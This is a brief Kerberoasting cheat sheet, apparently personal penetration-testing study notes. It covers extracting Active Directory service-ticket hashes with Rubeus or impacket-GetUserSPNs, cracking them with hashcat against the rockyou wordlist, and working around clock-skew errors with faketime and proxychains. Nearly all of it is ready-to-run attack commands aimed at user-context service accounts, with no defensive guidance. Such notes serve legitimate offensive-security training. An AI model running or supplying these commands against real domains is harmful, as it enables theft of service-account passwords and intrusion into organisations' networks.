# Kerberoasting

Any authenticated user can request a service ticket (TGS) for any SPN. The TGS is encrypted with the service account's password hash — crack offline to get the plaintext password.

```bash
# From Windows
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

# From Linux
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete

# Crack
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

> Computer accounts and managed service accounts use 120-character random passwords — cracking is infeasible. Focus on user-context SPNs.

---

## Fixing: Clock Skew Too Great Error

1. Get the DC's current time:
```bash
proxychains net time -S DC_IP
```

2. Run the command with faketime temporarily:
```bash
faketime '2026-06-28 19:33:11' proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.138.240 beyond.com/john
```
